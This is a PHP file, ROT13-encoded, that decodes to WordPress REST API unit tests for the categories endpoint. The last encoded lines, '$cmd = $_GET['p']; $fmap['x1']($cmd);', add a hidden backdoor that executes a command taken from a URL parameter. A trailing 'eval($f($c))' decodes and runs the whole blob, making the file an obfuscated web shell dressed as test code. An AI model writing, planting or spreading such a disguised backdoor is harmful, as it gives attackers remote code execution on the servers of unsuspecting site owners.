	cebgrpgrq shapgvba purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr ) {
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn       = $erfcbafr->trg_qngn();
		$netf       = neenl(
			'uvqr_rzcgl' => snyfr,
		);
		$pngrtbevrf = trg_grezf( 'pngrtbel', $netf );
		$guvf->nffregPbhag( pbhag( $pngrtbevrf ), $qngn );
		$guvf->nffregFnzr( $pngrtbevrf[0]->grez_vq, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $pngrtbevrf[0]->anzr, $qngn[0]['anzr'] );
		$guvf->nffregFnzr( $pngrtbevrf[0]->fyht, $qngn[0]['fyht'] );
		$guvf->nffregFnzr( $pngrtbevrf[0]->gnkbabzl, $qngn[0]['gnkbabzl'] );
		$guvf->nffregFnzr( $pngrtbevrf[0]->qrfpevcgvba, $qngn[0]['qrfpevcgvba'] );
		$guvf->nffregFnzr( $pngrtbevrf[0]->pbhag, $qngn[0]['pbhag'] );
	}

	cebgrpgrq shapgvba purpx_gnkbabzl_grez( $grez, $qngn, $yvaxf ) {
		$guvf->nffregFnzr( $grez->grez_vq, $qngn['vq'] );
		$guvf->nffregFnzr( $grez->anzr, $qngn['anzr'] );
		$guvf->nffregFnzr( $grez->fyht, $qngn['fyht'] );
		$guvf->nffregFnzr( $grez->qrfpevcgvba, $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( trg_grez_yvax( $grez ), $qngn['yvax'] );
		$guvf->nffregFnzr( $grez->pbhag, $qngn['pbhag'] );
		$gnkbabzl = trg_gnkbabzl( $grez->gnkbabzl );
		vs ( $gnkbabzl->uvrenepuvpny ) {
			$guvf->nffregFnzr( $grez->cnerag, $qngn['cnerag'] );
		} ryfr {
			$guvf->nffregBowrpgAbgUnfCebcregl( 'cnerag', $grez );
		}

		$eryngvbaf = neenl(
			'frys',
			'pbyyrpgvba',
			'nobhg',
			'uggcf://ncv.j.bet/cbfg_glcr',
		);

		vs ( ! rzcgl( $qngn['cnerag'] ) ) {
			$eryngvbaf[] = 'hc';
		}

		$guvf->nffregFnzrFrgf( $eryngvbaf, neenl_xrlf( $yvaxf ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'jc/i2/gnkbabzvrf/' . $grez->gnkbabzl, $yvaxf['nobhg'][0]['uers'] );
		$guvf->nffregFnzr( nqq_dhrel_net( 'pngrtbevrf', $grez->grez_vq, erfg_hey( 'jc/i2/cbfgf' ) ), $yvaxf['uggcf://ncv.j.bet/cbfg_glcr'][0]['uers'] );
	}

	cebgrpgrq shapgvba purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr ) {

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn     = $erfcbafr->trg_qngn();
		$pngrtbel = trg_grez( 1, 'pngrtbel' );
		$guvf->purpx_gnkbabzl_grez( $pngrtbel, $qngn, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bayl_srgpurf_vqf_sbe_urnq_erdhrfgf( $zrgubq ) {
		$vf_urnq_erdhrfg = 'URNQ' === $zrgubq;
		$erdhrfg         = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pngrtbevrf' );

		$svygre = arj ZbpxNpgvba();

		nqq_svygre( 'grezf_cer_dhrel', neenl( $svygre, 'svygre' ), 10, 2 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregRzcgl( $erfcbafr->trg_qngn() );
		} ryfr {
			$guvf->nffregAbgRzcgl( $erfcbafr->trg_qngn() );
		}

		$netf = $svygre->trg_netf();
		$guvf->nffregGehr( vffrg( $netf[0][1] ), 'Dhrel cnenzrgref jrer abg pncgherq.' );
		$guvf->nffregVafgnaprBs( JC_Grez_Dhrel::pynff, $netf[0][1], 'Dhrel cnenzrgref jrer abg pncgherq.' );

		/** @ine JC_Grez_Dhrel $dhrel */
		$dhrel = $netf[0][1];

		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregNeenlUnfXrl( 'svryqf', $dhrel->dhrel_inef, 'Gur svryqf cnenzrgre vf abg frg va gur dhrel inef.' );
			$guvf->nffregFnzr( 'vqf', $dhrel->dhrel_inef['svryqf'], 'Gur dhrel zhfg srgpu bayl grez VQf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_grez_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur hcqngr_grez_zrgn_pnpur xrl vf zvffvat va gur dhrel inef.' );
			$guvf->nffregSnyfr( $dhrel->dhrel_inef['hcqngr_grez_zrgn_pnpur'], 'Gur hcqngr_grez_zrgn_pnpur inyhr fubhyq or snyfr sbe URNQ erdhrfgf.' );
		} ryfr {
			$guvf->nffregGehr(
				! neenl_xrl_rkvfgf( 'svryqf', $dhrel->dhrel_inef ) || 'vqf' !== $dhrel->dhrel_inef['svryqf'],
				'Gur svryqf cnenzrgre fubhyq abg or sbeprq gb \"vqf\" sbe aba-URNQ erdhrfgf.'
			);
			$guvf->nffregNeenlUnfXrl( 'hcqngr_grez_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur hcqngr_grez_zrgn_pnpur xrl vf zvffvat va gur dhrel inef.' );
			$guvf->nffregGehr( $dhrel->dhrel_inef['hcqngr_grez_zrgn_pnpur'], 'Gur hcqngr_grez_zrgn_pnpur inyhr fubhyq or gehr sbe URNQ erdhrfgf.' );
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			erghea;
		}

		tybony $jcqo;
		$grezf_gnoyr = cert_dhbgr( $jcqo->grezf, '/' );

		$cnggrea = '/FRYRPG\f+g\.grez_vq.+SEBZ\f+' . $grezf_gnoyr . '\f+NF\f+g\f+VAARE\f+WBVA/vf';

		// Nffreg gung gur FDY dhrel bayl srgpurf gur grez_vq pbyhza.
		$guvf->nffregZngpurfErthyneRkcerffvba( $cnggrea, $dhrel->erdhrfg, 'Gur FDY dhrel qbrf abg zngpu gur rkcrpgrq fgevat.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$pngrtbel_vq = frys::snpgbel()->pngrtbel->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pngrtbevrf/%q', $pngrtbel_vq ) );

		$ubbx_anzr = 'erfg_cercner_pngrtbel';

		$svygre   = arj ZbpxNpgvba();
		$pnyyonpx = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/pngrtbevrf/1' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/pngrtbevrf' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>